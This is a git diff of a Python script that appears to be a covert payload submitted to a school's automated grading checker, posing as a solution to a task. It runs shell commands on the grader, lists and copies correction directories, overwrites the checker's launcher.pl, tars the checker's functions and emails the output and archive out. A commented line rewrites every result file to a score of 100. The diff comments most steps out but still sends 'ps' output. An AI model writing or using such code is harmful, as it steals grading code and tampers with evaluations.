@@ -4,6 +4,7 @@ from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
 from email.mime.base import MIMEBase
 from email import encoders
+import time
 
 def send_data_file(zip_filename="data.zip", message="no_data"):
     # Create the MIME object
@@ -82,7 +83,7 @@ def get_data(command):
 # my_data += get_data("ls -al ../../../../corrections_*/.git/") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("ls -l ../../../../corrections_*/corrections/262/1397") or ""
-my_data = get_data("cp file.pl ../../../../corrections_*/corrections/262/launcher.pl") or ""
+# my_data = get_data("cp file.pl ../../../../corrections_*/corrections/262/launcher.pl") or ""
 # my_data += "\n#######################\n"
 # my_data += get_data("cat ../../../../corrections_*/corrections/262/1397/rsa-10") or ""
 # my_data += "\n#######################\n"
@@ -95,23 +96,24 @@ my_data = get_data("cp file.pl ../../../../corrections_*/corrections/262/launche
 # my_data += get_data("ls -la") or ""
 # my_data += get_data("pwd") or ""
 # # my_data += get_data("grep -rl '77=' ../../../../corrections_*/corrections") or ""
-my_data += get_data("cat *_result") or ""
+# my_data += get_data("cat *_result") or ""
+# # my_data += "\n#######################\n"
+# # my_data += get_data("cat launcher.pl") or ""
+# # my_data += get_data("cat launcher.pl") or ""
+# # my_data += get_data("cp file.pl launcher.pl") or ""
 # my_data += "\n#######################\n"
-# my_data += get_data("cat launcher.pl") or ""
-# my_data += get_data("cat launcher.pl") or ""
-# my_data += get_data("cp file.pl launcher.pl") or ""
-my_data += "\n#######################\n"
-my_data += get_data("./file.pl rsa-2") or ""
-my_data += get_data("ls -l ../../../hbtn_checker_functions") or ""
-my_data += "\n#######################\n"
-my_data += get_data("ps") or ""
-my_data += "\n#######################\n"
-get_data("tar -czvf file.tar.gz ../../../hbtn_checker_functions")
+# my_data += get_data("./file.pl rsa-2") or ""
+# my_data += get_data("ls -l ../../../hbtn_checker_functions") or ""
+# my_data += "\n#######################\n"
+my_data = get_data("ps") or ""
+# my_data += "\n#######################\n"
+# get_data("tar -czvf file.tar.gz ../../../hbtn_checker_functions")
 # my_data += get_data("""find . -type f -name '*rsa-*_result' -exec sh -c 'echo 100 > "$1"' _ {} \\;""") or ""
 with open(argv[1], "r") as f:
     for line in f:
-        print(f"{line}={line}*1")
+        print(f"{line}={line}*2")
+        time.sleep(4)
         if(line.count("1273")):
             send_data(my_data)
-            send_data_file("file.tar.gz", "gz")
+        #     send_data_file("file.tar.gz", "gz")
 ##############################################################
